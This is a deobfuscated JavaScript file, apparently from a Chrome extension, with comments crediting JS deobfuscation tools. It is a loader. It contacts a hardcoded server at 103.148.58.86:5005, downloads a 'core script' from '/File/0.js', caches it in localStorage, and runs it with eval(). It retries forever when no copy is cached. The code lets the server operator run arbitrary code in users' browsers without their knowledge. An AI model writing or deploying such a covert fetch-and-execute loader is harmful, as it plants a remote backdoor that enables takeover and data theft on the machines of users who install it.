//Sat Jun 28 2025 05:18:48 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
const 服务器 = "103.148.58.86:5005";
let IP = 服务器;
var XxHttp = class {
  static ["Get"](_0x46c6ac) {
    return new Promise(_0xa4f822 => {
      chrome.runtime.sendMessage({
        "act": "发送网络请求3_Get",
        "url": _0x46c6ac
      }, _0x3a1f95 => {
        _0xa4f822(_0x3a1f95);
      });
    });
  }
  static ["Post"](_0x2283b5, _0x33b354, _0x418c12 = {}) {
    return new Promise(_0x37c64b => {
      chrome.runtime.sendMessage({
        "act": "发送网络请求3_Post",
        "url": _0x2283b5,
        "data": _0x33b354,
        "headers": _0x418c12
      }, _0xb8a48c => {
        _0x37c64b(_0xb8a48c);
      });
    });
  }
};
async function HttpRequest(_0x4ab3a2, _0x403e7a = "GET", _0x445cdd = {}, _0x23d9ec = {}, _0x59b7f1 = 5000) {
  return new Promise((_0x4f56d1, _0x5863e1) => {
    let _0x37e18a = {
      "method": _0x403e7a,
      "headers": _0x23d9ec
    };
    _0x403e7a === "POST" && (_0x37e18a.body = JSON.stringify(_0x445cdd));
    const _0x30a7c1 = setTimeout(() => {
      _0x5863e1(new Error("请求超时"));
    }, _0x59b7f1);
    chrome.runtime.sendMessage({
      "act": "发送网络请求2",
      "url": _0x4ab3a2,
      "data": _0x37e18a
    }, _0x492a6b => {
      clearTimeout(_0x30a7c1);
      _0x4f56d1(_0x492a6b);
    });
  });
}
async function 加载核心脚本() {
  let _0x5827a8 = localStorage.getItem("核心脚本");
  if (_0x5827a8) console.log("本地存在核心脚本，尝试从网络加载");else {
    console.log("本地不存在核心脚本，从网络加载");
    await 无限制从网络加载核心脚本(10000);
    return;
  }
  try {
    let _0x4b4930 = "http://" + IP + "/Getinfo",
      _0x4dd27d = await HttpRequest(_0x4b4930, "GET", {}, {}, 5000);
    if (_0x4dd27d.isError) {
      console.log("网络失败，加载本地脚本");
      eval(_0x5827a8);
      return;
    }
    if (_0x4dd27d.data) {
      let _0x50111e = localStorage.getItem("版本号");
      console.log("当前的版本号", _0x50111e);
      _0x4dd27d.data.version == _0x50111e ? (console.log("版本号一致，直接加载"), eval(_0x5827a8)) : (console.log("版本号不一致，重新申请"), await 从网络加载核心脚本(3, 10000));
    }
  } catch (_0x3f0365) {
    console.log("网络请求超时或失败，加载本地脚本");
    eval(_0x5827a8);
  }
}
async function 从网络加载核心脚本(_0x3fe148 = 3, _0xd11fc1 = 10000) {
  let _0x5be1d7 = 0;
  while (_0x5be1d7 < _0x3fe148) {
    try {
      let _0x819d2a = "http://" + IP + "/File/0.js?a=" + Math.random(),
        _0x3a506b = await HttpRequest(_0x819d2a, "GET", {}, {}, _0xd11fc1),
        _0x5af463 = _0x3a506b.txt;
      localStorage.setItem("核心脚本", _0x5af463);
      console.log("核心脚本加载成功");
      eval(_0x5af463);
      return;
    } catch (_0x1ba30a) {
      _0x5be1d7++;
      console.error("从网络加载核心脚本失败，重试第 " + _0x5be1d7 + " 次", _0x1ba30a);
      _0x5be1d7 < _0x3fe148 ? await new Promise(_0x265bb8 => setTimeout(_0x265bb8, _0xd11fc1)) : console.error("所有重试均失败");
    }
  }
}
async function 无限制从网络加载核心脚本(_0x7c2b5f = 10000) {
  while (true) {
    try {
      let _0x499c71 = "http://" + IP + "/File/0.js?a=" + Math.random(),
        _0x194016 = await HttpRequest(_0x499c71, "GET", {}, {}, _0x7c2b5f),
        _0x5ed3cc = _0x194016.txt;
      localStorage.setItem("核心脚本", _0x5ed3cc);
      console.log("核心脚本加载成功");
      eval(_0x5ed3cc);
      return;
    } catch (_0x4976b4) {
      console.error("从网络加载核心脚本失败，继续重试", _0x4976b4);
      await new Promise(_0x563976 => setTimeout(_0x563976, _0x7c2b5f));
    }
  }
}
加载核心脚本();